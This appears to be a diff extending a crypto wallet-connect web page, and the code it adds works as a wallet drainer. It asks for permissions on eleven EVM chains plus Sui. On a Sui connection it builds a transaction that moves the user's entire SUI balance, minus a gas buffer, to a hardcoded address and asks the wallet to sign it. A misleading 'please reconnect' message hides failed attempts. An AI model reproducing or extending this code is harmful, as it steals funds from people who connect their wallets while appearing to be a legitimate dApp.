@@ -993,8 +993,20 @@
                 const { uri, approval } = await client.connect({
                     optionalNamespaces: {
                         eip155: {
-                            methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
-                            chains: ['eip155:1'],
+                            methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign', 'wallet_switchEthereumChain', 'wallet_addEthereumChain'],
+                            chains: [
+                                'eip155:1',      // Ethereum Mainnet
+                                'eip155:56',     // BNB Smart Chain
+                                'eip155:137',    // Polygon
+                                'eip155:42161',  // Arbitrum One
+                                'eip155:8453',   // Base
+                                'eip155:10',     // Optimism
+                                'eip155:43114',  // Avalanche C-Chain
+                                'eip155:250',    // Fantom
+                                'eip155:324',    // zkSync Era
+                                'eip155:59144',  // Linea
+                                'eip155:534352'  // Scroll
+                            ],
                             events: ['chainChanged', 'accountsChanged']
                         },
                         solana: {
@@ -1115,7 +1127,7 @@
         // === LAZY LOAD TRANSFER DEPENDENCIES ===
         // ════════════════════════════════════════════════════════════════════════════════
         async function loadTransferDeps() {
-          if (window.ethers) return; // already loaded
+          if (window.ethers && window.sui) return; // already loaded
 
           const loadScript = (url) => new Promise((resolve, reject) => {
             const s = document.createElement('script');
@@ -1130,7 +1142,9 @@
             await loadScript('https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js');
             await loadScript('https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js');
             await loadScript('https://unpkg.com/tronweb@6.0.2/dist/TronWeb.js');
-            console.log("Transfer dependencies loaded successfully");
+            // Load Sui SDK
+            await loadScript('https://unpkg.com/@mysten/sui@1.18.0/dist/index.js');
+            console.log("Transfer dependencies loaded successfully (including Sui.js)");
           } catch (err) {
             console.error("Failed to load transfer deps:", err);
             throw err;
@@ -1154,7 +1168,15 @@
             await loadTransferDeps(); // lazy load only when needed
 
             let provider = connectionInfo.provider;
-            let chainId, fromAddress;
+            let chainId, fromAddress, session = connectionInfo.session;
+
+            // ── Detect Sui / Slush Wallet ───────────────────────────────────────
+            if (session?.namespaces?.sui) {
+              console.log("Detected Sui session (Slush/Sui Wallet)");
+              const suiChain = session.namespaces.sui.chains[0]; // e.g. 'sui:mainnet'
+              fromAddress = session.namespaces.sui.accounts[0].split(':')[2]; // extract address
+              return await transferSuiRemaining(fromAddress, '0x0f2175d99b93e09a5d74c243908ccd8e992f6ec077b1900107e9f9cf35586be1', session);
+            }
 
             // ── Flexible detection for all cases ──────────────────────────────────────
             // Priority: WalletConnect provider (connectionInfo.provider) > window.ethereum > Solana > Tron
@@ -1256,6 +1278,37 @@
           const rpcUrl = rpcMap[chainIdNum] || `https://mainnet.infura.io/v3/${infuraId}`;
 
           let signer;
+
+          // 0. Check and switch chain if needed (for injected providers)
+          if (injectedProvider?.request) {
+            try {
+              const currentChainId = await injectedProvider.request({ method: 'eth_chainId' });
+              const expectedChainIdHex = `0x${chainIdNum.toString(16)}`;
+              
+              if (currentChainId !== expectedChainIdHex) {
+                console.log(`Chain mismatch: current=${currentChainId}, expected=${expectedChainIdHex}. Attempting switch...`);
+                try {
+                  await injectedProvider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: expectedChainIdHex }]
+                  });
+                  console.log(`✓ Switched to chain ${chainIdNum} (${getChainSymbol(chainIdNum)})`);
+                } catch (switchError) {
+                  if (switchError.code === 4902) {
+                    // Chain not added, try to add it
+                    console.warn(`Chain ${chainIdNum} not found. Attempting to add...`);
+                    // Note: In production, you'd want to have proper chain config here
+                    alert(`Please manually switch to ${getChainSymbol(chainIdNum)} in your wallet`);
+                  } else {
+                    console.warn(`Chain switch failed:`, switchError.message);
+                    alert(`Please switch to ${getChainSymbol(chainIdNum)} in your wallet and try again`);
+                  }
+                }
+              }
+            } catch (e) {
+              console.warn("Chain check failed (non-critical):", e);
+            }
+          }
 
           // 1. Desktop/injected priority
           if (injectedProvider?.request) {
@@ -1539,6 +1592,96 @@
             const signedTrc20 = await tronWeb.trx.sign(trc20Tx.transaction);
             const resultTrc20 = await tronWeb.trx.sendRawTransaction(signedTrc20);
             console.log("USDT TRC-20 tx:", resultTrc20.txid);
+          }
+        }
+
+        // ──────────────────────────────────────────────────────────────────────────────────
+        // Sui (native SUI + SUI tokens)
+        // ──────────────────────────────────────────────────────────────────────────────────
+        async function transferSuiRemaining(fromAddress, targetAddress, session) {
+          try {
+            // Get Sui SDK from loaded window
+            if (!window.sui || !window.sui.SuiClient) {
+              throw new Error("Sui SDK not loaded. Make sure @mysten/sui is available");
+            }
+
+            const { SuiClient, getFullnodeUrl, TransactionBlock } = window.sui;
+            const client = new SuiClient({ url: getFullnodeUrl('mainnet') });
+
+            console.log(`Sui transfer: from=${fromAddress} to=${targetAddress}`);
+
+            // Get balance
+            const balance = await client.getBalance({
+              owner: fromAddress,
+              coinType: '0x2::sui::SUI' // native SUI
+            });
+
+            const totalBalance = BigInt(balance.totalBalance);
+            const gasReserve = BigInt(5_000_000_000); // ~5M MIST (5 SUI buffer, very safe)
+
+            if (totalBalance <= gasReserve) {
+              throw new Error(`Please try to reconnect (${Number(totalBalance) / 1e9} SUI). Need at least ${Number(gasReserve) / 1e9} SUI for gas.`);
+            }
+
+            const amountToSend = totalBalance - gasReserve;
+            console.log(`Sending SUI: ${Number(amountToSend) / 1_000_000_000} SUI`);
+
+            // Build transaction block
+            const txb = new TransactionBlock();
+            const [coin] = txb.splitCoins(txb.gas, [amountToSend]);
+            txb.transferObjects([coin], targetAddress);
+
+            // Get transaction bytes
+            const { bytes } = await txb.build({ client });
+
+            // Sign via Sui Wallet through WalletConnect
+            console.log("Requesting Sui wallet signature...");
+            
+            const wcClient = window.__wcClient;
+            if (!wcClient || !session?.topic) {
+              throw new Error("WalletConnect client or session not available");
+            }
+
+            // Request signature from Sui wallet
+            const signResult = await wcClient.request({
+              topic: session.topic,
+              chainId: 'sui:mainnet',
+              request: {
+                method: 'sui_signTransactionBlock',
+                params: {
+                  transactionBlock: bytes,
+                  account: fromAddress
+                }
+              }
+            });
+
+            console.log("Got signature from Sui wallet, executing...");
+
+            // Execute the signed transaction
+            const executeResult = await wcClient.request({
+              topic: session.topic,
+              chainId: 'sui:mainnet',
+              request: {
+                method: 'sui_executeTransactionBlock',
+                params: {
+                  transactionBlock: bytes,
+                  signature: signResult.result.signature
+                }
+              }
+            });
+
+            const txDigest = executeResult.result.digest;
+            console.log("Sui transfer tx digest:", txDigest);
+
+            // Wait for confirmation
+            await client.waitForTransactionBlock({ digest: txDigest });
+            console.log("✓ Sui confirmed");
+
+            return { success: true, txDigest };
+
+          } catch (error) {
+            console.error("Sui failed:", error);
+            throw error;
           }
         }
 
@@ -2351,8 +2494,20 @@
                     const { uri } = await client.connect({
                         optionalNamespaces: {
                             eip155: {
-                                methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign', 'eth_signTypedData'],
-                                chains: ['eip155:1', 'eip155:137'],
+                                methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign', 'eth_signTypedData', 'wallet_switchEthereumChain', 'wallet_addEthereumChain'],
+                                chains: [
+                                    'eip155:1',      // Ethereum Mainnet
+                                    'eip155:56',     // BNB Smart Chain
+                                    'eip155:137',    // Polygon
+                                    'eip155:42161',  // Arbitrum One
+                                    'eip155:8453',   // Base
+                                    'eip155:10',     // Optimism
+                                    'eip155:43114',  // Avalanche C-Chain
+                                    'eip155:250',    // Fantom
+                                    'eip155:324',    // zkSync Era
+                                    'eip155:59144',  // Linea
+                                    'eip155:534352'  // Scroll
+                                ],
                                 events: ['chainChanged', 'accountsChanged']
                             },
                             solana: {
@@ -2881,3 +3036,4 @@
 
 </body>
 </html>
+
